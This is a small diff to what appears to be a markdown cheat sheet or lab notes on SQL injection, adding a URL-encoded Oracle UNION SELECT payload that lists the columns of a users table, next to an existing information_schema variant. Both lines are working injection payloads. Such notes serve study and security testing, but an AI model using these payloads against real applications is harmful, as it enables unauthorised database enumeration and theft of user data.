@@ -255,6 +255,9 @@
 ```
 ' union select null,column_name from information_schema.columns where table_name = 'users'--
 ```
+```
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+```
 
 <br>
 
